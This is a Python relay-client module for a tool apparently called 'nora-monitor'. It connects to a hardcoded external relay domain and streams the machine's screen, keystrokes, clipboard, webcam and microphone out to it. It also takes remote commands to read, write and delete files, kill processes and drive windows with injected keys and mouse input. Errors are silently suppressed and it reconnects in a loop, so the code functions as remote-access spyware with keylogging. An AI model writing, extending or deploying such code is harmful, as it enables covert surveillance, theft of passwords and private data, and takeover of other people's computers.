"""
Connects the nora-monitor to the relay server as a Socket.IO client.

Set NORA_RELAY env var to the relay URL (default: https://mon.eclipselivecam.online).
The PC's hostname is used as the agent name; override with NORA_NAME.
"""

import os
import platform
import socket
import threading
import socketio

RELAY_URL = os.environ.get("NORA_RELAY", "https://mon.eclipselivecam.online")
AGENT_NAME = os.environ.get("NORA_NAME", "") or platform.node() or socket.gethostname() or "agent"

_sio = None
_controller = None
_recorder = None
_camera = None
_mic = None
_lock = threading.Lock()


def init(controller_fn, recorder, camera, mic=None):
    global _controller, _recorder, _camera, _mic
    _controller = controller_fn
    _recorder = recorder
    _camera = camera
    _mic = mic


def _emit(event, data):
    try:
        if _sio and _sio.connected:
            _sio.emit(event, data)
    except Exception:
        pass


def broadcast_frame(b64):      _emit("frame",        {"data": b64})
def broadcast_key(char):       _emit("key",          {"char": char})
def broadcast_camera(b64):     _emit("camera_frame", {"data": b64})
def broadcast_clipboard(text): _emit("clipboard",    {"text": text})
def broadcast_ngrok_url(url):  _emit("ngrok_url",    {"url": url})
def broadcast_audio(b64):      _emit("audio",        {"data": b64})


def _connect_loop():
    global _sio
    sio = socketio.Client(
        reconnection=True,
        reconnection_attempts=0,
        reconnection_delay=2,
        reconnection_delay_max=30,
        logger=False,
        engineio_logger=False,
    )
    with _lock:
        _sio = sio

    @sio.on("connect")
    def _on_connect():
        sio.emit("register", {"name": AGENT_NAME})

    @sio.on("command")
    def _on_command(data):
        if _controller:
            try: _controller(data)
            except Exception: pass

    @sio.on("get_processes")
    def _on_get_processes(data):
        try:
            import processes as proc
            procs = proc.get_processes()
            sio.emit("processes_result", {
                "processes": procs,
                "_requester": data.get("_requester"),
            })
        except Exception:
            pass

    @sio.on("kill_process")
    def _on_kill(data):
        try:
            import processes as proc
            proc.kill_process(int(data.get("pid", 0)))
        except Exception:
            pass

    @sio.on("list_dir")
    def _on_list_dir(data):
        try:
            import file_manager as fm
            path = data.get("path") or fm.home_dir()
            result = fm.list_dir(path)
            result["_requester"] = data.get("_requester")
            sio.emit("dir_result", result)
        except Exception:
            pass

    @sio.on("read_file")
    def _on_read_file(data):
        try:
            import file_manager as fm
            result = fm.read_file(data.get("path", ""))
            result["_requester"] = data.get("_requester")
            sio.emit("file_data", result)
        except Exception:
            pass

    @sio.on("write_file")
    def _on_write_file(data):
        try:
            import file_manager as fm
            result = fm.write_file(data.get("path", ""), data.get("data", ""))
            result["_requester"] = data.get("_requester")
            sio.emit("write_result", result)
        except Exception:
            pass

    @sio.on("delete_path")
    def _on_delete_path(data):
        try:
            import file_manager as fm
            result = fm.delete_path(data.get("path", ""))
            result["_requester"] = data.get("_requester")
            result["path"] = data.get("path", "")
            sio.emit("delete_result", result)
        except Exception:
            pass

    @sio.on("win_capture_start")
    def _on_win_capture_start(data):
        try:
            import windows_control as wc
            hwnd = data.get("hwnd")
            if hwnd:
                wc.start_window_capture(int(hwnd), lambda b64: sio.emit("win_frame", {"data": b64}))
        except Exception:
            pass

    @sio.on("win_capture_stop")
    def _on_win_capture_stop(_data=None):
        try:
            import windows_control as wc
            wc.stop_window_capture()
        except Exception:
            pass

    @sio.on("list_windows")
    def _on_list_windows(data):
        try:
            import windows_control as wc
            wins = wc.list_windows()
            sio.emit("windows_list", {"windows": wins, "_requester": data.get("_requester") if data else None})
        except Exception:
            pass

    @sio.on("win_key")
    def _on_win_key(data):
        try:
            import windows_control as wc
            hwnd = data.get("hwnd")
            if hwnd:
                wc.send_key(int(hwnd), data.get("key", ""))
        except Exception:
            pass

    @sio.on("win_mouse")
    def _on_win_mouse(data):
        try:
            import windows_control as wc, mss
            hwnd = data.get("hwnd")
            if not hwnd:
                return
            with mss.mss() as s:
                m = s.monitors[1]
                sw_r, sh_r = m["width"], m["height"]
            sx = data.get("x", 0) / data.get("sw", sw_r) * sw_r
            sy = data.get("y", 0) / data.get("sh", sh_r) * sh_r
            wc.send_mouse(int(hwnd), sx, sy, data.get("action", "click"), data.get("button", 0))
        except Exception:
            pass

    @sio.on("desktop_cmd")
    def _on_desktop_cmd(data):
        try:
            import windows_control as wc
            {"new": wc.desktop_new, "left": wc.desktop_left,
             "right": wc.desktop_right, "close": wc.desktop_close}.get(data.get("cmd", ""), lambda: None)()
        except Exception:
            pass

    @sio.on("camera_on")
    def _on_cam_on(_data=None):
        if _camera:
            try: _camera.start()
            except Exception: pass

    @sio.on("camera_off")
    def _on_cam_off(_data=None):
        if _camera:
            try: _camera.stop()
            except Exception: pass

    @sio.on("mic_on")
    def _on_mic_on(_data=None):
        if _mic:
            try: _mic.start()
            except Exception: pass

    @sio.on("mic_off")
    def _on_mic_off(_data=None):
        if _mic:
            try: _mic.stop()
            except Exception: pass

    while True:
        try:
            sio.connect(RELAY_URL, transports=["polling"])
            sio.wait()
        except Exception:
            import time; time.sleep(5)


def run():
    """Start the relay client in a background daemon thread."""
    t = threading.Thread(target=_connect_loop, daemon=True, name="relay-client")
    t.start()
